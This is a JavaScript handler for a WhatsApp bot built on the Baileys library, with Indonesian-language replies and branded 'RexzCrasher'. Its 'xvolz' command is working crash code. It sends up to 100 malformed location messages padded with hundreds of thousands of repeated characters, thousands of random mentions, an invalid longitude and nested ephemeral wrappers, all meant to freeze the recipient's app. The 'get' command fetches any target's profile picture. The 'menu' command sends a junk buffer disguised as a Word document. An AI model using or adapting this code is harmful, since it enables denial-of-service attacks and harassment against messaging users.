// RexzCase.js
import {
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  useMultiFileAuthState,
  makeWASocket,
  proto
} from "@whiskeysockets/baileys";
import ytSearch from 'yt-search';
import ytdl from 'ytdl-core';
import chalk from "chalk";
import axios from 'axios';
import fs from 'fs';

export default async function RexzSuki(sock, msgUpdate) {
  try {
    if (!msgUpdate.messages?.length) return;
    const m = msgUpdate.messages[0];
    if (!m.message?.conversation) return;

    const text = m.message.conversation;

    const prefix = ".";
    if (!text.startsWith(prefix)) return;
    const isBan = false;
    const Var = { 
    	waUploadToServer: sock.waUploadToServer,
    decodeJid: (jid) => jid.split('@')[0],
    relayMessage: sock.relayMessage.bind(sock),
    user: sock.user
};

const reply = async (teks) => sock.sendMessage(m.key.remoteJid, { text: teks }, { quoted: m });

const XReaction = async () => sock.sendMessage(m.key.remoteJid, { react: { text: "⏳", key: m.key } });

const args = text.slice(prefix.length).trim().split(/ +/);
const command = args.shift().toLowerCase();
    
    const vcard = `BEGIN:VCARD
VERSION:3.0
N:;ttname;;;
FN:ttname
item1.TEL;waid=13135550002:+1 (313) 555-0002
item1.X-ABLabel:Ponsel
END:VCARD`;

    const fakeMenuMetaAiQuoted = {
      key: {
        fromMe: false,
        participant: "13135550002@s.whatsapp.net",
        remoteJid: "status@broadcast",
        id: "XezstrysBot-003"
      },
      message: {
        contactMessage: {
          displayName: "💫 𝗩𝗜𝗣",
          vcard: vcard
        }
      },
      pushName: "Xezstrys Bot"
    };
    
    switch (command) {

case "xvolz": {
  try {
    const target = m.key.remoteJid;
    const count = Math.min(Number(args[0]) || 1, 100);

    const fuckRexzSuki = {
      key: {
        participant: null,
        remoteJid: "status@broadcast",
        id: "©RexzSuki"
      },
      message: {
        conversation: "㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞𝐫🕊️\n" + "ꦾ".repeat(2025)
      },
      pushName: "©RexzSuki"
    };

    function generateRandomLids(count = 2025) {
      const lids = new Set();
      while (lids.size < count) {
        const randomNum = Math.floor(Math.random() * 1e15).toString().padStart(15, '0');
        lids.add(randomNum + "@lid");
      }
      return Array.from(lids);
    }

    function mentionJid() {
      return generateRandomLids();
    }

const locationMsg = proto.Message.LocationMessage.fromObject({
  degreesLatitude: -9.09165299926,
  degreesLongitude: 199.197369996311,
  name: "㑒 ⏤⃟𝐑͢𝐞⃔𝐱𝐳⃟𝐂͢𝐫⃔𝐚𝐬⃟𝐡⃔͢𝐞ʳ ཀ͜͡🕊️ \n" + "ꦾ".repeat(252525),
  address: "",
  url: "https://㑒 ⏤⃟𝐑͢𝐞⃔𝐱𝐳⃟𝐂͢𝐫⃔𝐚𝐬⃟𝐡⃔͢𝐞ʳ ཀ͜͡🕊️ " + "ꦃ".repeat(225) + ".crasher",
  isLive: true,
  accuracyInMeters: 252525,
  jpegThumbnail: null,
  contextInfo: {
    forwardingScore: 252525,
    isForwarded: true,
    mentionedJid: mentionJid(),
    externalAdReply: {
      renderLargerThumbnail: false,
      clickToWhatsappCall: true,
      showAdAttribution: false,
      containsAutoReply: false,
      originalImageUrl: null,
      disableNudge: true,
      thumbnail: null,
      mediaType: 2,
      title: "",
      body: "⃢⃟⃞⃝⃟⃞⃝?⃟⃞⃝⃞⃟⃝?⃢⃟⃞⃝⃟⃞⃝",
      ctwaClid: "",
      sourceId: "",
      mediaUrl: "",
      ctaPayload: ""
    }
  }
});

    const msgContent = {
      ephemeralMessage: {
        message: {
          viewOnceMessageV2: {
            message: {
              locationMessage: locationMsg
            }
          }
        },
        ephemeralExpiration: 252525
      }
    };

    for (let i = 0; i < count; i++) {
      const msg = generateWAMessageFromContent(target, msgContent, {
        userJid: sock.user.id,
        quoted: fuckRexzSuki
      });
      await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
      console.log(`xvolz nested forwarded location sent: ${i + 1}/${count}`);
    }

  } catch (err) {
    console.error("xvolz error:", err);
  }
  break;
}

case "get": {
  try {
    const allowedUsers = [
      "241442157031534@lid",
      "244414341509342@lid",
      "269544178327708@lid"
    ];

    const sender = m.key.participant || m.key.remoteJid;

    if (!allowedUsers.includes(sender)) {
      await sock.sendMessage(m.key.remoteJid, {
        text: "*😹 Kacung Ga Di ajak*"
      }, { quoted: fakeMenuMetaAiQuoted });
      return;
    }

    let targetJid = null;

    if (args[0]) {
      const arg = args[0].toLowerCase();
      if (arg === "me") targetJid = m.key.participant || m.key.remoteJid;
      else if (arg === "bot") targetJid = sock.user.id || sock.user.jid;
      else {
        let num = arg.replace(/^(?:https?:\/\/)?(?:wa\.me\/)?/, "").replace(/\D/g, "");
        if (num) targetJid = `${num}@s.whatsapp.net`;
      }
    }

    if (!targetJid && m.message?.extendedTextMessage?.contextInfo?.participant) {
      targetJid = m.message.extendedTextMessage.contextInfo.participant;
    }

    if (!targetJid) {
      await sock.sendMessage(m.key.remoteJid, { 
        text: "*🫩Gausah gitu anj pake no atau rep chat target*" 
      }, { quoted: fakeMenuMetaAiQuoted });
      return;
    }

    let ppUrl;
    try { 
      ppUrl = await sock.profilePictureUrl(targetJid, "image"); 
    } catch { 
      ppUrl = null; 
    }

    if (!ppUrl) {
      await sock.sendMessage(m.key.remoteJid, { 
        text: "*🫩Suki Tu org g ada photo profile gimana mau di .get*" 
      }, { quoted: fakeMenuMetaAiQuoted });
      return;
    }

    const res = await axios.get(ppUrl, { responseType: "arraybuffer", timeout: 15000 });
    const imgBuffer = Buffer.from(res.data);

    await sock.sendMessage(m.key.remoteJid, {
      image: imgBuffer,
      caption: `*✅ Successfully*\n*Get Profile Picture* @${targetJid.split("@")[0]}`,
      mentions: [targetJid],
      mimetype: "image/jpeg",
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "© 𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶 𝗕𝗼𝘁",
          body: "",
          mediaType: 2,
          thumbnail: fs.readFileSync("./々RexzSuki/rexz.webp"),
          mediaUrl: "https://github.com",
          sourceUrl: ""
        }
      }
    }, { quoted: fakeMenuMetaAiQuoted });

  } catch (err) {
    console.error(err);
    await sock.sendMessage(m.key.remoteJid, { 
      text: "*❌ Gagal Mengunduh Profile Picture*" 
    }, { quoted: fakeMenuMetaAiQuoted });
  }
  break;
}

case "menu": {
  const allowedUsers = [
    "241442157031534@lid"
  ];

  const sender = m.key.participant || m.key.remoteJid;
  const userCommand = command || "unknown";
  const userTime = new Date().toLocaleTimeString("id-ID", { hour12: false });
  const start = Date.now();
  const end = Date.now();
  const speed = end - start;

  console.log(
    chalk.white("\n") + "┏╾" + "<💭>" +
    chalk.bgGreen.black("[ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 ]") + " " +
    chalk.cyan.bold(`.${userCommand}`) + " <⏰>" +
    chalk.bgGray.white.bold(`[${userTime}]`) + " " +
    chalk.white(" ") + " " +
    chalk.white("\n") + "┣" + 
    chalk.yellow.bold(`[ ${sender} ]`) + " " + "©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶" +
    chalk.white("\n") + "┗╾≫" + " " +
    chalk.bgRed.black("[️々]") + " " +
    chalk.white.bold("Sending with out message . . .") + " "
  );

  if (!allowedUsers.includes(sender)) {
    await sock.sendMessage(
      m.key.remoteJid,
      {
        text: "*⁉️Lu Ga ada akses buat jalanin perintah bot*",
      },
      { quoted: fakeMenuMetaAiQuoted }
    );
    break;
  }
  
  await sock.sendPresenceUpdate('composing', m.key.remoteJid);
await new Promise(resolve => setTimeout(resolve, 2000));
await sock.sendPresenceUpdate('paused', m.key.remoteJid);

  const thumbPath = "./々RexzSuki/rexz.webp";
  const thumbExists = fs.existsSync(thumbPath);
  const thumbBuffer = thumbExists ? fs.readFileSync(thumbPath) : null;
  const text = `
*⚠️ 𝗖𝗼𝗺𝗶𝗻𝗴 𝘀𝗼𝗼𝗻. . .*
> *Credits* : https://ẉ.ceo/RexzSuki
`;

  const suki = {
    title: "© 𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶 𝗕𝗼𝘁",
    body: "",
    thumbnail: thumbBuffer,
    sourceUrl: "https://github.com",
    mediaType: 1,
    renderLargerThumbnail: false,
  };

  const fakeDoc = Buffer.alloc(100 * 100 * 100, "㑒 `𝐅𝐮𝐜𝐤𝐑𝐞𝐱𝐳 || 𝐒𝐢𝐠𝐦𝐚 𝐁𝐨𝐲𝐬 🥵");

  const mentions = ['status@broadcast'];

  await sock.sendMessage(m.key.remoteJid, { react: { text: "⏳", key: m.key } });

  await sock.sendMessage(
    m.key.remoteJid,
    {
      document: fakeDoc,
      mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      fileName: "🕊️ ©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶",
      caption: text,
      contextInfo: { 
        externalAdReply: suki,
        mentionedJid: mentions,
        ai: true,
        forwardingScore: 256,
        isForwarded: true,
        businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363297418923556@newsletter",
          newsletterName: "🕊️𝐑𝐞𝐱𝐳𝐒𝐮𝐤𝐢 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥",
          serverMessageId: null
        }
      },
    },
    { quoted: fakeMenuMetaAiQuoted }
  );

  await sock.sendMessage(m.key.remoteJid, { react: { text: "✅", key: m.key } });

  const audioPath = "./々RexzSuki/rexz.opus";
  if (fs.existsSync(audioPath)) {
    const audioBuffer = fs.readFileSync(audioPath);
    await sock.sendMessage(
      m.key.remoteJid,
      {
        audio: audioBuffer,
        mimetype: "audio/ogg; codecs=opus",
        ptt: true
      },
    );
  }
  break;
}

      default:
        console.log(`*Command "${command}" belum dibuat*`);
        break;
    }
  } catch (err) {
    console.error("⚠️ Error di RexzSuki.js :", err);
  }
}